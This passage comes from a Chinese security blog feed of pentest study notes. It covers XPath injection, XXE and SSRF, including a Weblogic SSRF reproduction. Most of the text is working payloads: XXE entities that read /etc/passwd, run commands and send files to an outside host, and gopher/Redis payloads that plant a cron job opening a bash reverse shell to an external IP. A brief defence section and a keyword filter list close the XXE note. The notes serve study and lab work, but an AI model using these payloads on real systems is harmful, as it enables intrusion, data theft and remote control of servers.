<h3 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php require_once(&quot;../header.php&quot;);</div><div class="line"></div><div class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</div><div class="line"></div><div class="line">  $xml=simplexml_load_string($x);</div><div class="line">  $xpath = &quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</div><div class="line">  $res = ($xml-&gt;xpath($xpath));</div><div class="line">  while(list( ,$node) = each($res)) &#123;</div><div class="line">      echo $node;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-30"><a href="#Payload-30" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="external">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="external">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="external">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="external">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="external">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="external">Web渗透测试攻略(下)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>XML实体注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/XML实体注入漏洞的利用与学习.html</id>
    <published>2017-07-18T05:34:42.000Z</published>
    <updated>2017-07-20T02:53:35.094Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><h4 id="使用simplexml-load-string函数解析body"><a href="#使用simplexml-load-string函数解析body" class="headerlink" title="使用simplexml_load_string函数解析body"></a>使用simplexml_load_string函数解析body</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = file_get_contents(&apos;php://input&apos;);</div><div class="line">$xml = simplexml_load_string($data);</div><div class="line">echo $xml-&gt;name;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><h4 id="漏洞测试方式1"><a href="#漏洞测试方式1" class="headerlink" title="漏洞测试方式1"></a>漏洞测试方式1</h4><p>有回显，直接读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe.png" alt=""></p>
<h4 id="漏洞测试方式2"><a href="#漏洞测试方式2" class="headerlink" title="漏洞测试方式2"></a>漏洞测试方式2</h4><p>无回显，引用远程服务器上的XML文件读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</div><div class="line">%remote;]&gt;</div></pre></td></tr></table></figure>
<p>将以下1.xml保存到WEB服务器下<br>1.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; </div><div class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe1.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe3.png" alt=""></p>
<h4 id="漏洞测试方式3"><a href="#漏洞测试方式3" class="headerlink" title="漏洞测试方式3"></a>漏洞测试方式3</h4><p>在主机上放一个接收文件的php(get.php):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">file_put_contents(&apos;01.txt&apos;, $_GET[&apos;xxe_local&apos;]);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>1.xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload	SYSTEM	 &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://xxe.com/get.php?xxe_local=%payload;&apos;&gt;&quot;&gt;</div><div class="line"></div><div class="line">%int;</div><div class="line"></div><div class="line">%trick;</div></pre></td></tr></table></figure></p>
<p>这个XML，他引用了外部实体etc/passwd作为payload的值，然后又将payload拼接到<a href="http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。" target="_blank" rel="external">http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。</a></p>
<p>接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。</p>
<p>发包过去后，就会请求1.xml，解析这个xml造成XXE攻击，读取etc/passwd并进行base64编码后传给get.php，最后保存到主机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe2.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe4.png" alt=""></p>
<p>查看01.txt<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe5.png" alt=""></p>
<p>base64解码<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe6.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe7.png" alt=""><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe8.png" alt=""></p>
<h2 id="XXE-危害"><a href="#XXE-危害" class="headerlink" title="XXE 危害"></a>XXE 危害</h2><ul>
<li>读取任意文件</li>
<li>执行系统命令</li>
<li>探查内网端口</li>
<li>攻击内网网站</li>
</ul>
<h3 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<h3 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<h3 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h3><p>结合其他的漏洞比如：struts2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>方案一、使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line"></div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
<p>方案二、过滤用户提交的XML数据</p>
<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://github.com/phith0n/vulhub/tree/master/php_xxe" target="_blank" rel="external">vulhub/php_xxe/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-098591.html" target="_blank" rel="external">Z-BLOG Blind-XXE造成任意文件读取 </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html</id>
    <published>2017-07-17T03:27:46.000Z</published>
    <updated>2017-07-21T01:10:06.820Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>拿常用的cURL举例，cURL默认支持的协议非常多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ curl -V</div><div class="line">curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  </div><div class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  </div><div class="line">Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets</div></pre></td></tr></table></figure>
<h4 id="本地利用姿势"><a href="#本地利用姿势" class="headerlink" title="本地利用姿势"></a>本地利用姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># dict protocol (操作Redis)</div><div class="line">curl -vvv &apos;dict://127.0.0.1:6379/info&apos;</div><div class="line"></div><div class="line"># file protocol (任意文件读取)</div><div class="line">curl -vvv &apos;file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol (一键反弹Bash)</div><div class="line"># * 注意: 链接使用单引号，避免$变量问题</div><div class="line">curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function curl($url)&#123;  </div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div></pre></td></tr></table></figure>
<h4 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 利用file协议任意文件读取</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># 利用dict协议查看端口</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</div><div class="line"></div><div class="line"># 利用gopher协议反弹shell</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</div></pre></td></tr></table></figure>
<h4 id="漏洞代码ssrf2-php"><a href="#漏洞代码ssrf2-php" class="headerlink" title="漏洞代码ssrf2.php"></a>漏洞代码ssrf2.php</h4><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>设置跳转重定向为True（默认不跳转）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function curl($url)&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</div><div class="line">    // 限制为HTTPS、HTTP协议</div><div class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="远程利用方式-1"><a href="#远程利用方式-1" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
<p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$schema = $_GET[&apos;s&apos;];</div><div class="line">$ip     = $_GET[&apos;i&apos;];</div><div class="line">$port   = $_GET[&apos;p&apos;];</div><div class="line">$query  = $_GET[&apos;q&apos;];</div><div class="line">if(empty($port))&#123;  </div><div class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </div><div class="line">&#125; else &#123;</div><div class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># dict protocol - 探测Redis</div><div class="line">dict://127.0.0.1:6379/info  </div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</div><div class="line"></div><div class="line"># file protocol - 任意文件读取</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol - 一键反弹Bash</div><div class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </div><div class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </div><div class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</div><div class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h2 id="Weblogic-SSRF漏洞复现"><a href="#Weblogic-SSRF漏洞复现" class="headerlink" title="Weblogic SSRF漏洞复现"></a>Weblogic SSRF漏洞复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="external">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="探查服务端口"><a href="#探查服务端口" class="headerlink" title="探查服务端口"></a>探查服务端口</h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="external">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</div><div class="line">Host: http://127.0.0.1:7001</div><div class="line">Content-Length: 133</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1:7001</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</div><div class="line">Connection: close</div><div class="line"></div><div class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</div></pre></td></tr></table></figure></p>
<p>返回以下信息，说明存在7001端口的服务器<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png" alt=""></p>
<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png" alt=""></p>
<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png" alt=""></p>
<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png" alt=""></p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
